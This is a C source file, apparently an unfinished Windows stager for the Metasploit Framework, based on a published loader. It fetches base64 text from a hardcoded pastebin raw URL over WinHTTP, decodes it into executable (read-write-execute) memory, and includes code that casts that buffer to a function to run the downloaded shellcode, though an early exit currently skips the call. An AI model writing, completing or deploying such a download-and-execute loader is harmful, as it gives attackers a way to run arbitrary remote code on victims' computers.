/*
 * A C-based stager client compat with the Metasploit Framework
 *    based on a discussion on the Metasploit Framework mailing list
 *
 * Sends an HTTP request to the designated host, searches for a startcode
 *    in the response, then reads in a length specifier, then n bytes of
 *    data (where n was determined by the length specifier).
 *
 * @author Dakota Nelson (dakota.w.nelson@gmail.com)
 *  based on a stager by Raphael Mudge (raffi@strategiccyber.com)
 *  Original code available at https://github.com/rsmudge/metasploit-loader
 * @license BSD License.
 *
 * Relevant messages:
 * * http://mail.metasploit.com/pipermail/framework/2012-September/008660.html
 * * http://mail.metasploit.com/pipermail/framework/2012-September/008664.html
 */

#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <winhttp.h>
#include <wincrypt.h>
//#include <cdecode.h>

/* set up winhttp */
HINTERNET winhttp_init() {
  /* see:
   * msdn.microsoft.com/en-us/library/windows/desktop/aa384098(v=vs.85).aspx 
   * */
  HINTERNET internet;
  LPCWSTR userAgent = L"Test User Agent";
  DWORD accessType = WINHTTP_ACCESS_TYPE_DEFAULT_PROXY;

  /* userAgent is optional */
  internet = WinHttpOpen(userAgent,
                         accessType,
                         WINHTTP_NO_PROXY_NAME,
                         WINHTTP_NO_PROXY_BYPASS, 0);

  return internet;
}

/* a quick routine to quit and report why we quit */
void punt(HINTERNET internet, char * error) {
  printf("Bad things: %s\n", error);
  printf("Official error: %lu\n", GetLastError());
  WinHttpCloseHandle(internet);
  exit(1);
}

int main(int argc, char * argv[]) {
  BYTE * buffer;
  void (*function)();
  DWORD size;
  HINTERNET hSession = NULL,
            hRequest = NULL,
            hConnect = NULL;

  LPSTR pszOutBuffer;
  DWORD dwSize = 0;
  DWORD dwDownloaded = 0;

  hSession = winhttp_init();

  if (argc != 3) {
    printf("%s [host] [port]\n", argv[0]);
    exit(1);
  }

  /* connect to target host */
  LPCWSTR host = L"www.pastebin.com";

  // if (hSession)
  hConnect = WinHttpConnect(hSession, host,
                          INTERNET_DEFAULT_HTTP_PORT, 0);

  /* send HTTP GET to target host */
  LPCWSTR path = L"/raw.php?i=XprAV403";

  // if (hConnect)
  hRequest = WinHttpOpenRequest(hConnect,
                                          L"GET",
                                          path,
                                          NULL,
                                          WINHTTP_NO_REFERER,
                                          WINHTTP_DEFAULT_ACCEPT_TYPES,
                                          0);

  if(hRequest == NULL) {
    punt(hSession, "could not open HTTP request\n");
  }

  BOOL success = WinHttpSendRequest(hRequest, 
                                    WINHTTP_NO_ADDITIONAL_HEADERS,
                                    0,
                                    WINHTTP_NO_REQUEST_DATA,
                                    0,
                                    0,
                                    0);

  if(!success) {
    punt(hSession, "could not send HTTP request\n");
  }

  /* receive response from server */
  if (!WinHttpReceiveResponse(hRequest, NULL)) {
    punt(hSession, "no response received\n");
  }

  WinHttpQueryDataAvailable(hRequest, &dwSize);
  pszOutBuffer = malloc(dwSize+1);

  ZeroMemory(pszOutBuffer, dwSize+1);

  WinHttpReadData(hRequest, (LPVOID)pszOutBuffer,
                  dwSize, &dwDownloaded);
  // request handle, buffer to write to, number of bytes to read,
  // number of bytes actually read

  printf("%s\n", pszOutBuffer);

  if (hRequest) WinHttpCloseHandle(hRequest);
  if (hConnect) WinHttpCloseHandle(hConnect);
  if (hSession) WinHttpCloseHandle(hSession);

  /* search for start code in returned text */

  // for now, assume it's the first 4 characters
  // TODO add an actual substring search for the start sequence

  /* read length immediately after start code */
  /*size = atoi(pszOutBuffer);
  printf("The length of the message is: %lu\n", size);

  // find the b64-encoded code block, separated from the length specifier by
  // a space

  char *b64code = strchr(pszOutBuffer, L" ");
  if(!b64code) {
    // improperly formatted payload
    printf("no space found\n");
  }

  printf("%s\n", b64code);*/

  // (index of the space in the payload) + 1 to get start index of b64
  /*DWORD b64index = (b64code - pszOutBuffer) + 1;

  printf("b64 data starts at index %lu\n", b64index);*/

  // TEST ENCODING TO SEE WHAT COMES OUT
  /*
  BYTE * toEncode = "This is a message.";
  LPSTR encoded[500];

  BOOL yay = CryptBinaryToString(toEncode, 28, CRYPT_STRING_BASE64, encoded, NULL);

  if (!yay) {
    printf("URGH\n");
    printf("Official error: %lu\n", GetLastError());
  }
  printf("%s\n", encoded);
  */

  BOOL win = CryptStringToBinary(pszOutBuffer, 0, CRYPT_STRING_BASE64 | CRYPT_STRING_STRICT,
                                 NULL, &size, NULL, NULL);

  /* allocate a RWX buffer */
  buffer = VirtualAlloc(0, size + 5, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
  if (buffer == NULL) {
    punt(hSession, "could not allocate buffer\n");
  }

  /* read <size> characters, b64 decode, then treat as code, and
   * toss our newly found shellcode into the buffer */
  //base64_decodestate *b64state;
  //base64_decode_block(b64code, size, buffer, b64state);

  win = CryptStringToBinary(pszOutBuffer, 0, CRYPT_STRING_BASE64 | CRYPT_STRING_STRICT,
                                 buffer, &size, NULL, NULL);

  if(!win) {
    printf("FAIL.\n");
    printf("Official error: %lu\n", GetLastError());
  }
  printf("b64 string was: %s\n", buffer);

  free(pszOutBuffer);
  exit(0);

  /* cast our buffer as a function and call it */
  function = (void (*)())buffer;
  function();

  return 0;
}

